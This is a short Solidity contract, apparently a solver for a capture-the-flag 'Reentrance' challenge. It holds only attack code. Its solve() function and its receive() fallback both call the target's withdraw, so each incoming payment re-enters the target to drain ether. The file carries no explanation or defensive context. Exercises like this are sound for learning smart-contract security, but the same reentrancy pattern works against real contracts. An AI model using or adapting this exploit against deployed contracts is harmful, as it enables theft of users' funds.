pragma solidity ^0.6.0;

interface IReentrance {
    function donate(address _to) external payable;
    function balanceOf(address _who) external view returns (uint256 balance);
    function withdraw(uint256 _amount) external;
}

contract ReentrancySolver {
    IReentrance challenge;

    constructor(address payable addr) public {
        challenge = IReentrance(addr);
    }

    function solve() external payable {
        challenge.withdraw(0.001 ether);
    }

    receive() external payable {
        challenge.withdraw(0.001 ether);
    }
}